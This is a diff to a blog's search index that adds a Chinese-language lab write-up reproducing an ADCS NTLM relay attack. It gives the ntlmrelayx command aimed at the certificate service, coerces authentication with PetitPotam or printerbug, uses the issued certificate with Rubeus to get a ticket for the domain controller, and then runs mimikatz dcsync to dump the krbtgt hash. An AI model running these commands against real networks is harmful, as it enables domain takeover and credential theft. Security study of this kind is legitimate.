@@ -4,6 +4,19 @@
   
   
   <entry>
+    <title>ADCS中继攻击复现</title>
+    <link href="/2022/06/02/ADCS%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0/"/>
+    <url>/2022/06/02/ADCS%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0/</url>
+    
+    <content type="html"><![CDATA[<h1 id="ADCS中继攻击"><a href="#ADCS中继攻击" class="headerlink" title="ADCS中继攻击"></a>ADCS中继攻击</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>hacker.com</p><p>域控（Windows server 2016）：192.168.179.136</p><p>域内ADCS服务器（Windows server 2012）：192.168.179.138</p><p>攻击机：192.168.179.132</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>ADCS的http证书接⼝没有启⽤NTLM中继保护，因此其易受NTLM Relay攻击。⽽且Authorization HTTP 标头明确只允许通过 NTLM 身份验证，因此Kerberos协议⽆法使⽤。因此，攻击者可以利⽤NTLM Relay攻击ADCS</p><p>搭建ADCS服务的机器和受害者主机（一般是域控）是同一台是不能利用，因为不能relay自己。</p><p>环境搭建过程参考：<a href="https://cloud.tencent.com/developer/article/1873728">https://cloud.tencent.com/developer/article/1873728</a></p><p><a href=""><img src="https://s1.ax1x.com/2022/06/02/XtzN0x.png" alt="XtzN0x.png"></a></p><p>Authorization HTTP头允许通过NTLM进行身份验证</p><p><a href=""><img src="https://s1.ax1x.com/2022/06/02/Xtztn1.png" alt="Xtztn1.png"></a></p><p>开启监听，老版本impacket没有这个功能，需要新的impacket：<a href="https://github.com/ExAndroidDev/impacket/tree/ntlmrelayx-adcs-attack">https://github.com/ExAndroidDev/impacket/tree/ntlmrelayx-adcs-attack</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python3 ntlmrelayx.py -t http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">179.138</span><span class="hljs-regexp">/certsrv/</span>certfnsh.asp -smb2support --adcs --template <span class="hljs-string">&#x27;domain controller&#x27;</span><br></code></pre></td></tr></table></figure><p>然后利用打印机漏洞强制域控访问kali，用PetitPotam或printerbug都可以，需要输入一个普通域用户和密码</p><p><a href=""><img src="https://s1.ax1x.com/2022/06/02/XtzU76.png" alt="XtzU76.png"></a></p><p>监听成功获取到base64编码的证书数据</p><p><a href=""><img src="https://s1.ax1x.com/2022/06/02/XtzdAK.png" alt="XtzdAK.png"></a></p><p>Rubeus导入证书数据，<code>WIN-3M4FNJUCANJ</code>是域控机器名</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Rubeus</span>.exe asktgt /user:WIN-<span class="hljs-number">3</span>M<span class="hljs-number">4</span>FNJUCANJ$ /certificate:打印出来的base<span class="hljs-number">64</span>证书数据 /ptt<br></code></pre></td></tr></table></figure><p><a href=""><img src="https://s1.ax1x.com/2022/06/02/XtzJXR.png" alt="XtzJXR.png"></a></p><p>mimikatz导出域内任意⽤户哈希</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nsis">mimikatz.exe<br><span class="hljs-comment">#查看kerberos票据</span><br><span class="hljs-class">kerberos::list</span><br><span class="hljs-comment">#导出krbtgt⽤户的hash</span><br><span class="hljs-class">lsadump::dcsync</span> /<span class="hljs-literal">user</span>:krbtgt /csv<br></code></pre></td></tr></table></figure><p><a href=""><img src="https://s1.ax1x.com/2022/06/02/XtzwtO.png" alt="XtzwtO.png"></a></p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>java加载shellcode方法整理</title>
     <link href="/2022/06/01/java%E5%8A%A0%E8%BD%BDshellcode%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"/>
     <url>/2022/06/01/java%E5%8A%A0%E8%BD%BDshellcode%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/</url>
